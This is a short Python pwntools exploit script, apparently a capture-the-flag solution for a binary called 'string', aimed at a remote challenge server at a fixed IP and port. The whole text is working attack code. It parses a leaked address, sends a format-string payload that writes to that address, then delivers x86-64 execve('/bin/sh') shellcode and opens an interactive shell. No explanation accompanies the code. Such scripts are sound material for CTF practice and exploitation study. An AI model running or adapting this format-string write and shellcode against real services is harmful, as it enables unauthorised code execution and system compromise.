from pwn import *
context.log_level='debug'
#sh=process('./string')
sh=remote('111.198.29.45','31633')
sh.recvuntil('secret[0] is ')
leak_addr = '0x'+sh.recvuntil('\n',drop=True)
print leak_addr
leak = eval(leak_addr)
sh.recvuntil('be:\n')
sh.sendline('name')
sh.recvuntil('up?:')
sh.sendline('east')
sh.sendlineafter('?:\n','1')
sh.sendlineafter("ss'\n",str(leak))

fmt= '%085d%7$n'
sh.sendlineafter('is:\n',fmt)
shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
#gdb.attach(sh)
sh.recv()
sh.sendline(shellcode)
sh.interactive()
